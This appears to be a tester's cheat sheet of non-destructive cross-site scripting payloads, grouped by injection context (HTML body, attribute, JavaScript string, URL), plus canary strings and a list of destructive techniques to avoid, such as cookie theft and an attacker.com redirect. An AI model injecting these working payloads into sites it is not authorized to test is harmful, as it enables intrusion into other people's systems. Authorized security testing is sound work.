# Safe XSS Payloads — Non-Destructive Testing

## Goals
- Prove JavaScript execution without causing harm
- Non-destructive payloads only
- Suitable for all target types including external

## Proof-of-Execution Payloads (Safe)
```html
<!-- Alert with domain (proves scope) -->
<script>alert(document.domain)</script>

<!-- Console log (silent, less disruptive) -->
<script>console.log('XSS-PROOF:'+document.domain)</script>

<!-- Change page title (visual proof, no popup) -->
<script>document.title='XSS-PROOF'</script>

<!-- Inject visible text element -->
<script>document.body.prepend(Object.assign(document.createElement('h1'),{textContent:'XSS-PROOF',style:'color:red;background:yellow;padding:10px'}))</script>
```

## Context-Specific Safe Payloads

### HTML Body
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

### HTML Attribute
```html
" onmouseover="alert(document.domain)
" onfocus="alert(document.domain)" autofocus="
"><script>alert(document.domain)</script>
```

### JavaScript String
```javascript
';alert(document.domain)//
\';alert(document.domain)//
</script><script>alert(document.domain)</script>
```

### URL/href
```
javascript:alert(document.domain)
```

## Canary Strings (Detection Without Execution)
Inject these first to check for reflection and encoding:
```
xss<test>"'`/\
<xss>test</xss>
xss{{7*7}}
```

## Payloads to AVOID (Destructive)
```
DO NOT use without authorization:
- Cookie theft: document.cookie sent to external server
- Page defacement: overwriting document.body.innerHTML
- Redirect: location.href = 'http://attacker.com'
- Keyloggers: capturing user keystrokes
- Credential harvesting: fake login forms
- Network scanning: internal network probing
```
